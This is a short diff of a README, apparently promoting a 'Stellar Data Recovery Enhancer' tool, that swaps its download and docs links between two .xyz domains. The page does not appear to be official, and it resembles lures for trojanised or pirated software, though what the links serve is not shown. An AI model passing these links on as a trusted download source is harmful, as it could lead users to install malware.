@@ -24,6 +24,6 @@ It's aimed at everyday users as much as power users.
 - ✅ **Workflow Automation:** Custom automations and integrations to streamline repetitive tasks.
 
 ## Download & Docs
-➡️ **[Grab the latest version](https://stellar-data-recovery-enhancer.softonx.xyz)**
+➡️ **[Grab the latest version](https://stellar-data-recovery-enhancer.softax.xyz)**
 
-Details & docs: https://stellar-data-recovery-enhancer.softonx.xyz                    
+Details & docs: https://stellar-data-recovery-enhancer.softax.xyz                    
